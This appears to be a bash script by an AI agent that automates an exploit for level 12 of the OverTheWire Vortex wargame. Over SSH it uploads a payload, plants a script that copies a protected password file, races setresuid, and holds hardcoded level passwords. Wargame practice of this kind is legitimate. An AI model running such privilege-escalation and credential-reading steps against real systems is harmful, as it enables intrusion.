#!/bin/bash
# fireT - fire /vortex/vortex12 with the payload over -T (no pty), as
# vortex12, then read the dropped password file.  The process-wide
# setresuid race is winnable with retries: up to 3 attempts of 60s.
cd /workspace/tools/vx/l12
ASKPASS=/home/claude/tools/askpass
KHOSTS=/home/claude/tools/known_hosts
B64=$(base64 -w0 sy.bin)
D64=$(base64 -w0 drv12.c)
for attempt in 1 2 3; do
  echo "--- attempt $attempt ---"
  OUT=$(OTW_PASS=YufVIb8Mo SSH_ASKPASS=$ASKPASS SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
    ssh -T -o UserKnownHostsFile=$KHOSTS -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no -o LogLevel=ERROR -p 2228 \
        vortex12@vortex.labs.overthewire.org \
        "mkdir -p /tmp/vx12u; echo $D64 | base64 -d > /tmp/vx12u/drv12.c; [ -x /tmp/vx12u/drv12 ] || (cd /tmp/vx12u && gcc -m32 -o drv12 drv12.c); echo $B64 | base64 -d > /tmp/vx12u/sy.bin; printf '%s\n' '#!/bin/sh' 'cp /etc/vortex_pass/vortex13 /tmp/vx12u/leak13.txt' 'chmod 644 /tmp/vx12u/leak13.txt' > '/tmp/vx12u/%d'; chmod +x '/tmp/vx12u/%d'; rm -f /tmp/vx12u/leak13.txt; PATH=/tmp/vx12u:\$PATH timeout 60 /tmp/vx12u/drv12 /tmp/vx12u/sy.bin > /tmp/vx12u/run.txt 2>&1; echo RC=\$?; ls -l /tmp/vx12u/leak13.txt 2>/dev/null && cat /tmp/vx12u/leak13.txt" 2>&1)
  echo "$OUT"
  if echo "$OUT" | grep -q "6iyARs3cY"; then echo "PASSWORD DROPPED"; break; fi
done
